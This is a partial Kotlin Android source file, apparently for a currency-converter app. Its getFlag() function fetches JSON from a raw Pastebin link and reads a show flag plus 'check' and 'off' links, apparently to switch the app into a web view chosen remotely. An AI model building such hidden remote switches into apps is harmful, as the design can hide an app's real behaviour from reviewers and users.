package monska.makkers.conver.currinci
...
import monska.makkers.conver.currinci.databinding.ActivityMainBinding
import monska.makkers.conver.currinci.util.AppsflyerUtil
import monska.makkers.conver.currinci.util.DataStoreManager
import monska.makkers.conver.currinci.util.Lottie
import monska.makkers.conver.currinci.util.Once
import monska.makkers.conver.currinci.util.internetConnection
import monska.makkers.conver.currinci.util.log
import monska.makkers.conver.currinci.util.setVisible
import monska.makkers.conver.currinci.util.webView.WebViewFragment
...
class MainActivity : AppCompatActivity(), AndroidFragmentApplication.Callbacks {
    ...
    private suspend fun getFlag() {
        val request: Request = Request.Builder().url("https://pastebin.com/raw/P0jBd7Ds").build()
        ...
        try {
            okHttpClient.newCall(request).execute().use { response ->
                if (response.isSuccessful) {
                    ...
                    val flag      = json.getBoolean("ukazka")
                    val key       = json.getString("keyboard")
                    val privacy   = json.getString("politika")
                    val linkCheck = json.getString("proverka")
                    val link      = json.getString("off")
